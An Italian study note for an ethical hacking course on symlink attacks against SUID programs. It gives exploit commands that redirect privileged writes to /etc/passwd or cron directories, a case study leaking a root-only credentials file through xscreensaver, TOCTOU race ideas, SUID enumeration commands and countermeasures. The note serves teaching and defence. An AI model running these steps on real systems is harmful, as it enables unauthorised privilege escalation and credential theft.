## tags: [eth, unix-hacking, privilege-escalation, filesystem, local-attack] capitolo: HE7 Ch.5 collegato: [[suid_binaries]], [[toctou]], [[command_injection]], [[nfs_attacks]]

# Symlink Attacks

## Idea Centrale

> Un programma con privilegi alti (SUID) che opera su file controllati dall'utente, **senza verificare se sono symlink**, può essere ingannato a leggere o scrivere file arbitrari nel sistema.

È un attacco **locale** di privilege escalation: ti serve già una shell sulla macchina, ma con privilegi bassi.

---

## I Due Ingredienti

### 1. SUID bit

Un binario SUID gira con i privilegi del **proprietario del file**, non dell'utente che lo lancia.

```bash
ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root ...  /usr/bin/passwd
   ↑
   's' = SUID. Owner = root → eseguito come root da chiunque.
```

Esempi tipici di binari SUID root: `passwd`, `su`, `sudo`, `ping` (legacy), `mount`, `chsh`. Servono perché devono fare operazioni privilegiate (scrivere shadow, aprire raw socket, ecc.) per conto di utenti non privilegiati.

Vedi nota dedicata: [[suid_binaries]].

### 2. Symbolic Link

File "puntatore" verso un altro file. Trasparente per chi apre il path: il syscall `open()` segue automaticamente il symlink di default.

```bash
ln -s /etc/passwd ~/mio_link
cat ~/mio_link          # mostra /etc/passwd
```

```bash
# Identificazione di un symlink
ls -la mio_link
lrwxrwxrwx 1 user user 11 ... mio_link -> /etc/passwd
↑
'l' = symbolic link
```

---

## Il Pattern Vulnerabile

Programma SUID che fa qualcosa tipo:

```c
// Esegue come root (SUID), legge file in home utente
FILE *f = fopen("/home/user/.config", "r");
parse_config(f);
```

Il programma fida del path. Se l'utente ha sostituito `~/.config` con un symlink verso `/etc/shadow`, il programma:

1. Apre `~/.config` → `open()` segue il symlink → apre `/etc/shadow`
2. Lo legge (può, è root via SUID)
3. Lo processa con la logica del programma
4. Spesso → leak del contenuto via output/error messages

---

## Varianti

### Variante Read — leggere file inaccessibili

Il programma SUID legge il file e ne mostra il contenuto (anche via error message). L'utente ottiene **arbitrary file read** come root.

### Variante Write — sovrascrivere file critici

Programma SUID scrive in un path controllato dall'utente:

```bash
# Programma SUID: open("/var/log/program.log", O_WRONLY|O_CREAT|O_APPEND)

# Exploit:
rm /var/log/program.log
ln -s /etc/passwd /var/log/program.log

# Lancia il programma SUID → scrive (append) sui contenuti di /etc/passwd
# Possibile inserzione di una nuova riga utente con UID=0
```

### Variante Create — creare file inattesi

Programma SUID che crea file in `/tmp` senza `O_EXCL`:

```bash
# Programma SUID fa: open("/tmp/prog_lock", O_WRONLY|O_CREAT)

# Exploit:
ln -s /etc/cron.d/exploit /tmp/prog_lock

# Lancia → file creato in /etc/cron.d/ con contenuto controllabile
# Privilege escalation via cron
```

---

## Case Study HE7 — xscreensaver 5.01 (King Cope, 2009)

`xscreensaver` su OpenSolaris installato SUID root. Legge config da `~/.xscreensaver`. Se la linea non è una direttiva valida, la stampa via verbose error.

### Setup

```bash
[scorpion]# ls -la /root/dbconnect.php
-rw------- 1 root root 39 ... /root/dbconnect.php       ← mode 600, solo root

[scorpion]# cat /root/dbconnect.php
$db_user = "mysql";
$db_pass = "1234";
```

L'utente `nathan` (non root) vuole leggere quel file.

### Exploit

```bash
[nathan]$ ln -s /root/dbconnect.php ~/.xscreensaver

[nathan]$ xscreensaver -verbose
xscreensaver: running as nathan/users (1000/1000); effectively root/root (0/0)
xscreensaver: /home/nathan/.xscreensaver:1: unparsable line: $db_user = "mysql";
xscreensaver: /home/nathan/.xscreensaver:2: unparsable line: $db_pass = "1234";
                                                  ↑
                                          IL LEAK ARRIVA QUI
```

### Cosa è successo

1. xscreensaver è SUID root → il processo gira come root (vedi `effectively root/root`)
2. Apre `~/.xscreensaver` → il syscall segue il symlink → apre `/root/dbconnect.php`
3. Legge il file (può, è root)
4. Parsing fallisce, ma il contenuto finisce negli error message
5. Output va al terminale di nathan → leak completato

L'utente non root ha letto un file mode 600 di root, senza exploit di memoria, senza vulnerabilità nel kernel. Solo logica applicativa fidata.

---

## /tmp come Terreno di Caccia Storico

`/tmp` è world-writable per design. Programmi SUID che creano file temporanei lì sono storicamente esposti:

```bash
# Trova programmi che usano /tmp
strings /usr/bin/* /usr/sbin/* 2>/dev/null | grep '/tmp/'

# Filtra solo SUID
find / -perm -4000 -type f 2>/dev/null | xargs -I{} sh -c 'strings "{}" | grep -l /tmp/ && echo "{}"'
```

Pattern tipici di file vulnerabili in /tmp:

- `/tmp/program.log` — log temporanei
- `/tmp/program.lock` — file di lock
- `/tmp/program.tmp.PID` — file temporanei dove PID è prevedibile
- `/tmp/.X11-unix/X0` — socket X11 (vedi [[x_window_system_attacks]])

---

## Race Conditions: dal Symlink Statico al TOCTOU

Versione base: il programma non controlla affatto i symlink. Attaccante prepara il symlink prima e lancia.

Versione avanzata: il programma controlla, ma c'è una **race condition** tra check e use:

```c
// Codice "difensivo" ma vulnerabile a TOCTOU
if (lstat(path, &st) == 0 && !S_ISLNK(st.st_mode)) {   // CHECK
    // ... attaccante swappa il file con un symlink qui ...
    fd = open(path, O_WRONLY);                          // USE
}
```

Tra `lstat` e `open` esiste una finestra (microsecondi) in cui l'attaccante può:

1. Cancellare il file
2. Sostituirlo con un symlink

Lanciato in loop, prima o poi vince la race → arbitrary write come SUID.

Questa è la base del [[toctou]] (Time Of Check vs Time Of Use): symlink attack è la versione statica, TOCTOU è la versione dinamica con race.

---

## Discovery / Enumeration

### Trovare binari SUID sul sistema

```bash
find / -perm -4000 -type f 2>/dev/null
# tutti i binari con SUID bit
```

### Trovare binari SUID che usano /tmp

```bash
find / -perm -4000 -type f 2>/dev/null | \
  xargs -I{} sh -c 'echo "=== {} ==="; strings "{}" | grep -E "/tmp/[a-z]" 2>/dev/null'
```

### Tracing con strace per vedere apertura file

```bash
strace -f -e trace=openat,open,lstat /usr/bin/some_suid_program 2>&1 | grep -E "open|lstat"
# vedi esattamente quali file il programma apre e in che ordine
```

### LinPEAS / linux-exploit-suggester / GTFOBins

- **LinPEAS**: enumeration automatica completa
- **GTFOBins** (gtfobins.github.io): database di binari SUID con exploit noti — sempre primo posto da controllare

---

## Countermeasures

### A livello di codice (per chi scrive software)

```c
// SBAGLIATO
int fd = open("/tmp/program.log", O_WRONLY|O_CREAT);

// MEGLIO — fail se il file esiste già (anche come symlink)
int fd = open("/tmp/program.log", O_WRONLY|O_CREAT|O_EXCL);

// MEGLIO ANCORA — nome unico generato dal kernel atomicamente
char template[] = "/tmp/program-XXXXXX";
int fd = mkstemp(template);

// IDEALE per file effimeri — niente nome, niente race
FILE *f = tmpfile();
```

Altre primitive moderne:

- `O_NOFOLLOW` su `open()` → fallisce se è un symlink
- `openat()` con file descriptor di parent directory → no race su path traversal
- `mkdtemp()` per creare directory temporanee uniche

### A livello di sistema (per sysadmin)

|Mitigazione|Cosa fa|
|---|---|
|**Rimuovere SUID** da binari non strettamente necessari|Riduce la superficie d'attacco|
|**`fs.protected_symlinks=1`** (sysctl)|Kernel rifiuta di seguire symlink in directory sticky (`/tmp`) se owner differisce|
|**`fs.protected_hardlinks=1`**|Variante analoga per hard link|
|`noexec,nosuid` mount option su `/tmp` e `/var/tmp`|Blocca esecuzione e SUID lì dentro|
|Per-user `/tmp` (systemd `PrivateTmp=yes`)|Isolamento namespace, ogni service ha il suo /tmp|
|AppArmor / SELinux|MAC su quali file un programma può aprire|
|Audit dei SUID con `setuid` enumeration tools|Rilevamento drift|

`fs.protected_symlinks=1` è particolarmente importante — è default nei kernel Linux moderni e protegge contro una grossa fetta degli attacchi /tmp.

---

## TL;DR esame

1. SUID = programma gira con privilegi del proprietario, non dell'esecutore
2. Symlink = file che punta a un altro path; `open()` lo segue trasparentemente
3. Vulnerabilità = programma SUID + accesso a path controllato dall'utente + nessun check symlink → arbitrary file read/write con privilegi del programma
4. Varianti: read (leak file inaccessibili), write (sovrascrivere /etc/passwd, cron, ecc.), create (file in path inattesi)
5. Caso HE7: xscreensaver 5.01 — symlink `~/.xscreensaver` → `/root/dbconnect.php` → leak via error messages "unparsable line"
6. /tmp è la zona di caccia storica perché world-writable
7. Versione race-based = [[toctou]] (Time Of Check vs Time Of Use)
8. Fix programmatici: `O_EXCL`, `O_NOFOLLOW`, `mkstemp`, `tmpfile`
9. Fix sistema: `fs.protected_symlinks=1`, rimozione SUID inutile, `noexec,nosuid` su /tmp
10. Discovery: `find / -perm -4000`, GTFOBins, LinPEAS